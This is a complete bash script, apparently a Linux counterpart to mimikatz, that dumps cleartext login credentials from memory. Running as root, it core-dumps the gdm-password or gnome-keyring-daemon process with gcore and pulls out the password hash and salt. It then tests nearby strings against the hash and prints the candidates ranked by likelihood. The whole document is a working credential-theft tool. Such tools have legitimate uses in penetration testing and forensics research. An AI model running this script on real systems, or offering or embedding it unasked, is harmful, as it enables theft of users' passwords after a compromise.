#!/bin/bash

# Author: Hunter Gregal
# Github: /huntergregal
# Contribution from pugilist - PID extraction method 
# Dumps cleartext credentials from memory

#root check
if [[ $EUID -ne 0 ]]; then
	echo "Root required - You are dumping memory..."
	echo "Even mimikatz requires administrator"
	exit 1
fi

#If Kali
if [[ `uname -a | awk '{print tolower($0)}'` == *"kali"* ]]; then
	#get gdm-session-worker [pam/gdm-password] process
	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
	DUMP="${DUMP}$(strings "/tmp/dump.${PID}" | egrep '^gkr_system_authtok$' -B 5 -A 5)"
fi

#If Ubuntu
if [[ `uname -a | awk '{print tolower($0)}'` == *"ubuntu"* ]]; then
	#get /usr/bin/gnome-keyring-daemon process
	PID="$(ps -eo pid,command | sed -rn '/gnome\-keyring\-daemon/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
	gcore -o /tmp/dump $PID >& /dev/null
	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
	SALT="$(echo $HASH | cut -d'$' -f 3)"
	DUMP=$(strings "/tmp/dump.${PID}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
fi

#Results to STDOUT - CSV style 
echo "Password located somewhere below:"
echo "Word,PasswordPotential"

#If hash, print it
if [[ $HASH ]]; then
	echo "$HASH,HASH"
fi

#Determine password potential for each word
while read -r line; do
	#if hash, prepare crypt line
	if [[ $HASH ]]; then
		CRYPT="\"$line\", \"\$6\$$SALT\""
		if [[ `python -c "import crypt; print crypt.crypt($CRYPT)"` == $HASH ]]; then
			echo "$line,HIGH	[HASH MATCH!]"
		fi
	fi
	if [[ $line =~ ^_pammodutil.+[0-9]$ ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^LOGNAME= ]]; then
		echo "$line,LOW"
	elif [[ $line =~ UTF\-8 ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^splayManager[0-9]$ ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^gkr_system_authtok$ ]]; then
		echo "$line,LOW"
	elif [[ $line =~ [0-9]{1,4}:[0-9]{1,4}: ]]; then
		echo "$line,LOW"
	elif [[ $line =~ Manager\.Worker ]]; then
		echo "$line,LOW"
	elif [[ $line =~ \/usr\/share ]]; then
		echo "$line,LOW"
	elif [[ $line =~ \/bin ]]; then
		echo "$line,LOW"
	elif [[ $line =~ libgck\-1\.so\.[0-1] ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^\/usr\/lib ]]; then
		echo "$line,LOW"
	elif [[ $line =~ libgio\-2\.0\.so\.[0-1] ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^linux\-vdso\.so\.[0-1] ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^tls\/x86_64 ]]; then
		echo "$line,LOW"
	elif [[ $line =~ ^n\-[a-z][0-9] ]]; then
		echo "$line,LOW"
	else
		echo "$line,MEDIUM"
	fi
done <<< "$DUMP"

#Cleanup
rm -rf "/tmp/dump.${PID}"
